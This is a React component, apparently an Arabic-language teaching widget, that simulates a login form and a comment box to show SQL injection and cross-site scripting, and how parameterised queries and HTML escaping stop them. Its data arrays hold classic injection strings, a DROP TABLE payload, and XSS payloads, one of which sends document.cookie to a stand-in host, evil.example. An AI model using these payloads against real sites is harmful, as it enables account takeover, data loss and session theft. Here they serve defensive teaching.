"use client";

import { AnimatePresence, motion } from "motion/react";
import { useState } from "react";

type LoginId = "normal" | "wrong" | "or" | "comment" | "drop";
type CommentId = "plain" | "bold" | "img" | "script";
type Status = "hit" | "blocked";

const LOGINS: { id: LoginId; label: string; name: string; pass: string; attack: boolean }[] = [
  { id: "normal", label: "سارة بكلمتها الصحيحة", name: "sara", pass: "sara123", attack: false },
  { id: "wrong", label: "كلمة خاطئة", name: "sara", pass: "guess", attack: false },
  { id: "or", label: "' OR '1'='1", name: "sara", pass: "' OR '1'='1", attack: true },
  { id: "comment", label: "admin' --", name: "admin' --", pass: "anything", attack: true },
  { id: "drop", label: "DROP TABLE", name: "x'; DROP TABLE users; --", pass: "x", attack: true },
];

const COMMENTS: { id: CommentId; label: string; text: string; attack: boolean }[] = [
  { id: "plain", label: "تعليق عادي", text: "Nice lamp, fast delivery!", attack: false },
  { id: "bold", label: "<b>", text: "<b>Great</b> price", attack: false },
  { id: "img", label: "<img onerror>", text: "<img src=x onerror=steal(document.cookie)>", attack: true },
  { id: "script", label: "<script>", text: "<script>fetch('//evil.example?c='+document.cookie)</script>", attack: true },
];

const USERS = [
  { id: 1, name: "admin", role: "admin" },
  { id: 2, name: "sara", role: "user" },
  { id: 3, name: "omar", role: "user" },
];

const ATTACKS = ["or", "comment", "drop", "img", "script"] as const;

interface LoginResult { ok: boolean; bad: boolean; text: string; rows: number[]; dropped: boolean }

function loginOutcome(id: LoginId, safe: boolean): LoginResult {
  if (id === "normal") return { ok: true, bad: false, text: "دخلت سارة. هكذا يعمل الموقع عادةً.", rows: [2], dropped: false };
  if (safe || id === "wrong") {
    const why = safe && id !== "wrong" ? " النص بحثت عنه القاعدة حرفياً كاسم أو كلمة مرور، ولا أحد يملكه." : "";
    return { ok: false, bad: false, text: "رُفض الدخول: لا مستخدم بهذا الاسم وكلمة المرور." + why, rows: [], dropped: false };
  }
  if (id === "or") return { ok: true, bad: true, text: "الشرط صحيح لكل صف! عادت الصفوف الثلاثة، فدخل المهاجم كأولها: المدير.", rows: [1, 2, 3], dropped: false };
  if (id === "comment") return { ok: true, bad: true, text: "-- جعلت فحص كلمة المرور تعليقاً. دخل المهاجم كمدير بلا كلمة مرور.", rows: [1], dropped: false };
  return { ok: false, bad: true, text: "علامة ; أنهت الجملة، وبدأ المهاجم أمراً ثانياً: حُذف جدول المستخدمين كله.", rows: [], dropped: true };
}

function escapeHtml(t: string) {
  return t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
}

/** A fake login form and comment box: send injection and XSS payloads, see what the server builds, then turn on each defence. */
export default function SecurityProblem() {
  const [login, setLogin] = useState<LoginId>("or");
  const [paramOn, setParamOn] = useState(false);
  const [lres, setLres] = useState<LoginResult | null>(null);
  const [lsent, setLsent] = useState<{ id: LoginId; safe: boolean } | null>(null);
  const [comment, setComment] = useState<CommentId>("img");
  const [escapeOn, setEscapeOn] = useState(false);
  const [csent, setCsent] = useState<{ id: CommentId; safe: boolean } | null>(null);
  const [score, setScore] = useState<Partial<Record<string, Status>>>({});
  const [k, setK] = useState(0);

  const L = LOGINS.find((x) => x.id === login)!;
  const C = COMMENTS.find((x) => x.id === comment)!;

  function sendLogin() {
    const r = loginOutcome(login, paramOn);
    setLres(r);
    setLsent({ id: login, safe: paramOn });
    setK((x) => x + 1);
    if (L.attack) setScore((s) => ({ ...s, [login]: r.bad ? "hit" : "blocked" }));
  }
  function sendComment() {
    setCsent({ id: comment, safe: escapeOn });
    setK((x) => x + 1);
    if (C.attack) setScore((s) => ({ ...s, [comment]: escapeOn ? "blocked" : "hit" }));
  }

  const sentL = lsent ? LOGINS.find((x) => x.id === lsent.id)! : null;
  const sentC = csent ? COMMENTS.find((x) => x.id === csent.id)! : null;
  const allBlocked = ATTACKS.every((a) => score[a] === "blocked");
  const hits = ATTACKS.filter((a) => score[a] === "hit").length;

  return (
    <div className="space-y-4">
      {/* Login */}
      <div className="rounded-2xl border border-line bg-surface p-4">
        <div className="flex flex-wrap items-center justify-between gap-2">
          <b>نموذج الدخول</b>
          <Toggle on={paramOn} set={setParamOn} label="استعلام بثقوب ($1, $2)" />
        </div>
        <div className="mt-3 flex flex-wrap gap-2" dir="ltr">
          {LOGINS.map((x) => (
            <button key={x.id} onClick={() => setLogin(x.id)} className={`code rounded-lg px-2.5 py-1 text-xs ${x.id === login ? "bg-accent text-accent-fg font-bold" : x.attack ? "border border-err/40 bg-surface-2 text-err" : "border border-line bg-surface-2 text-muted"}`}>
              {x.label}
            </button>
          ))}
        </div>
        <div className="mt-3 grid gap-2 sm:grid-cols-[1fr_1fr_auto]">
          <Field label="الاسم" value={L.name} />
          <Field label="كلمة المرور" value={L.pass} />
          <motion.button whileTap={{ scale: 0.93 }} onClick={sendLogin} className="self-end rounded-xl bg-accent px-5 py-2 font-bold text-accent-fg">
            دخول
          </motion.button>
        </div>

        <AnimatePresence mode="wait">
          {lsent && sentL && lres && (
            <motion.div key={`l${k}`} initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} className="mt-4 grid gap-3 md:grid-cols-[1fr_auto]">
              <div>
                <div className="mb-1 text-sm text-muted">ما يصل إلى قاعدة البيانات</div>
                <pre dir="ltr" className="code overflow-x-auto whitespace-pre-wrap break-all rounded-xl bg-code p-3 text-xs leading-6 text-code-fg">
                  {lsent.safe ? (
                    <>
                      <div>SELECT * FROM users WHERE name = <span className="font-bold text-num">$1</span> AND password = <span className="font-bold text-num">$2</span></div>
                      <div className="mt-1 text-code-fg/70">
                        params: [<span className="text-str">{JSON.stringify(sentL.name)}</span>, <span className="text-str">{JSON.stringify(sentL.pass)}</span>]
                      </div>
                    </>
                  ) : (
                    <div>
                      SELECT * FROM users WHERE name = &apos;<User text={sentL.name} attack={sentL.attack} />&apos; AND password = &apos;<User text={sentL.pass} attack={sentL.attack} />&apos;
                    </div>
                  )}
                </pre>
                <p className={`mt-2 text-sm ${lres.bad ? "text-err" : lres.ok ? "text-ok" : "text-muted"}`}>{lres.text}</p>
              </div>
              <UsersTable rows={lres.rows} dropped={lres.dropped} />
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Comments */}
      <div className="rounded-2xl border border-line bg-surface p-4">
        <div className="flex flex-wrap items-center justify-between gap-2">
          <b>صندوق التعليقات</b>
          <Toggle on={escapeOn} set={setEscapeOn} label="اعرضه كنص (escape)" />
        </div>
        <div className="mt-3 flex flex-wrap gap-2" dir="ltr">
          {COMMENTS.map((x) => (
            <button key={x.id} onClick={() => setComment(x.id)} className={`code rounded-lg px-2.5 py-1 text-xs ${x.id === comment ? "bg-accent text-accent-fg font-bold" : x.attack ? "border border-err/40 bg-surface-2 text-err" : "border border-line bg-surface-2 text-muted"}`}>
              {x.label}
            </button>
          ))}
        </div>
        <div className="mt-3 grid gap-2 sm:grid-cols-[1fr_auto]">
          <Field label="التعليق" value={C.text} />
          <motion.button whileTap={{ scale: 0.93 }} onClick={sendComment} className="self-end rounded-xl bg-accent px-5 py-2 font-bold text-accent-fg">
            انشر
          </motion.button>
        </div>

        <AnimatePresence mode="wait">
          {csent && sentC && (
            <motion.div key={`c${k}`} initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} className="mt-4 grid gap-3 md:grid-cols-2">
              <div>
                <div className="mb-1 text-sm text-muted">الـ HTML الذي يرسله الخادم لكل زائر</div>
                <pre dir="ltr" className="code overflow-x-auto whitespace-pre-wrap break-all rounded-xl bg-code p-3 text-xs leading-6 text-code-fg">
                  &lt;p&gt;<span className={csent.safe ? "text-str" : sentC.attack ? "font-bold text-err" : "text-str"}>{csent.safe ? escapeHtml(sentC.text) : sentC.text}</span>&lt;/p&gt;
                </pre>
              </div>
              <div>
                <div className="mb-1 text-sm text-muted">ما يحدث في متصفح الزائر</div>
                <Preview id={csent.id} text={sentC.text} safe={csent.safe} />
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Scoreboard */}
      <div className="flex flex-wrap items-center gap-2 text-sm">
        <span className="text-muted">الهجمات:</span>
        {ATTACKS.map((a) => {
          const st = score[a];
          const label = LOGINS.find((x) => x.id === a)?.label ?? COMMENTS.find((x) => x.id === a)?.label;
          return (
            <motion.span key={a} animate={{ scale: st ? [1.2, 1] : 1 }} dir="ltr" className={`code rounded-lg px-2 py-1 text-xs ${st === "hit" ? "bg-err/15 text-err ring-1 ring-err" : st === "blocked" ? "bg-ok/15 text-ok ring-1 ring-ok" : "bg-surface-2 text-muted/60"}`}>
              {st === "hit" ? "✗ " : st === "blocked" ? "✓ " : ""}{label}
            </motion.span>
          );
        })}
      </div>

      {hits >= 2 && !allBlocked && (
        <motion.p initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-muted">
          لاحظت؟ في كل هجوم ناجح دخل نص المستخدم إلى مكان يُقرأ فيه <b className="text-fg">كأمر</b>: جملة SQL أو وسوم HTML. شغّل الدفاعين وأعد الهجمات نفسها.
        </motion.p>
      )}
      {allBlocked && (
        <motion.div initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} className="rounded-2xl border border-ok/40 bg-ok/10 p-4 text-sm">
          <b className="text-ok">صُدّت الهجمات الخمس.</b> البيانات بقيت بيانات في الحالتين. وهذان جداران فقط من عدة جدران:
          <div className="mt-2 flex flex-wrap gap-1.5">
            {["كلمات مرور مجزّأة (hash)", "HTTPS في كل صفحة", "أقل الصلاحيات", "تحديد المعدل", "تحديث الحزم", "لا أسرار في Git"].map((t) => (
              <span key={t} className="rounded-lg border border-line bg-surface px-2 py-0.5">{t}</span>
            ))}
          </div>
        </motion.div>
      )}
    </div>
  );
}

function Toggle({ on, set, label }: { on: boolean; set: (v: boolean) => void; label: string }) {
  return (
    <button onClick={() => set(!on)} className={`flex items-center gap-2 rounded-xl border px-3 py-1.5 text-sm ${on ? "border-ok bg-ok/10 text-ok" : "border-line bg-surface-2 text-muted"}`}>
      <span className={`relative h-4 w-7 rounded-full ${on ? "bg-ok" : "bg-line"}`}>
        <motion.span layout className="absolute top-0.5 h-3 w-3 rounded-full bg-surface" style={{ left: on ? 14 : 2 }} />
      </span>
      {label}
    </button>
  );
}

function Field({ label, value }: { label: string; value: string }) {
  return (
    <label className="block text-sm">
      <span className="text-muted">{label}</span>
      <div dir="ltr" className="code mt-1 truncate rounded-xl border border-line bg-surface-2 px-3 py-2 text-xs">{value}</div>
    </label>
  );
}

function User({ text, attack }: { text: string; attack: boolean }) {
  return <span className={`rounded px-0.5 font-bold ${attack ? "bg-err/25 text-err" : "text-str"}`}>{text}</span>;
}

function UsersTable({ rows, dropped }: { rows: number[]; dropped: boolean }) {
  return (
    <div className="min-w-[10rem]">
      <div className="mb-1 text-sm text-muted">جدول users</div>
      <div dir="ltr" className={`code overflow-hidden rounded-xl border text-xs ${dropped ? "border-err" : "border-line"}`}>
        {USERS.map((u) => (
          <motion.div
            key={u.id}
            animate={dropped ? { opacity: 0.25, x: 12 } : { opacity: 1, x: 0 }}
            transition={{ delay: dropped ? u.id * 0.15 : 0 }}
            className={`flex justify-between gap-3 border-b border-line px-2 py-1 last:border-0 ${rows.includes(u.id) ? "bg-accent-soft/60 font-bold" : ""} ${dropped ? "line-through text-err" : ""}`}
          >
            <span>{u.name}</span>
            <span className={u.role === "admin" ? "text-err" : "text-muted"}>{u.role}</span>
          </motion.div>
        ))}
      </div>
    </div>
  );
}

function Preview({ id, text, safe }: { id: CommentId; text: string; safe: boolean }) {
  const pwned = !safe && (id === "img" || id === "script");
  return (
    <div className={`min-h-[4.5rem] rounded-xl border p-3 text-sm ${pwned ? "border-err bg-err/10" : "border-line bg-surface-2"}`}>
      <div dir="ltr" className="break-all">
        {safe ? (
          <span>{text}</span>
        ) : id === "bold" ? (
          <span><b>Great</b> price</span>
        ) : id === "img" ? (
          <span className="inline-block rounded border border-dashed border-err/50 px-2 text-xs text-err">broken image: x</span>
        ) : id === "script" ? null : (
          <span>{text}</span>
        )}
      </div>
      {pwned && (
        <motion.p initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="mt-2 font-bold text-err">
          سكربت المهاجم يعمل في متصفح كل زائر: أُرسل الكوكي إلى evil.example، والمهاجم صار يدخل بحساباتهم.
        </motion.p>
      )}
      {safe && (id === "img" || id === "script") && <p className="mt-2 text-ok">ظهر الهجوم كنص عادي. لا وسم، ولا سكربت.</p>}
      {!safe && id === "bold" && <p className="mt-2 text-muted">الزائر قرر شكل صفحتك. اليوم خط عريض، وغداً سكربت.</p>}
    </div>
  );
}
